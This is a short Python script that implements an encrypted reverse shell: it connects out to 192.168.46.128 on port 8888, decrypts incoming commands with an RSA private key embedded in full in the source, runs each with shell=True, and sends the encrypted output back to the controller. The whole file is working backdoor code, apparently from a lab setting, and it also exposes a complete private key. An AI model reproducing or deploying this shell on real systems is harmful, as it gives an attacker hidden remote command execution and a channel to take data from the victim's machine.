import socket
import subprocess
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl8+CZEsvk1UDnYQwxgJT
FTf++pXJ7UO1kFKZSM93ANUoWOTws+jAn17mSD2rZVngI4UpvrWwgfJUzDn/eW5l
uCWq4WeHcX1l/TRhNn4FQs3MyS41TeztNfQ3y+AeaVZeFXgtUrloDgrkLd1JoC60
7bNASGcy83WNzXCGbvZVP2+mJgvusnPBBn5gJ0nJ6L5XMIRB9JqXO4yKxK9yjjoR
arDitBUDxa0+XxJf9B4qqUWe6rJRziPgpV7LiQOvE2zI5+A53yRvzzmCHsz3Oovb
cKdJVYnN8pJ4hZdZR9VT1I16xSpFCoJaozakH+b4+F0uJ1MAu0w0wuR+spVXMXFT
XbfFxgrIeD3VLnu5rR/vMydndsUH2QVqI3gPO23hDaULred8I84e3fhibYy5wQ24
kkCy0h5PKqCdh1zD59BLUvH3I+Ei84Q6pFxbPvxBqIHycaHFvraRKH0WFBLc8td0
BcgIpr8rdcCCnoq7CFiexYojnspb2C7HpYAWgxX9SC7tZMRMYnL+K7YDsQaGYSzj
aDMWGU09d+NNcCy1z5XHoumUCUA6P/FRONHgLyiE7GrXq3u0tNjxYXaJD85ZF+Zo
hFRZSWsx2TEXAuEKCgz4xMy4wwmbcQIdgF3XwRgRa5anpku70CQqU9cHTtnpJ79V
kldbVun5j1N0dwBld2isj/cCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def connecting():
    s = socket.socket()
    s.connect(("192.168.46.128",8888))

    while True:
        command = s.recv(1024)
        command = decrypt(command)
        print(command)

        if 'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            result = CMD.stdout.read()
            print (len(result))

            if len (result) > 470:
                for i in range(0, len(result), 470):
                    chunk = result[0+i:470+i]
                    s.send(encrypt(chunk))
            else:
                s.send(encrypt(result))

def main():
    connecting()
main()
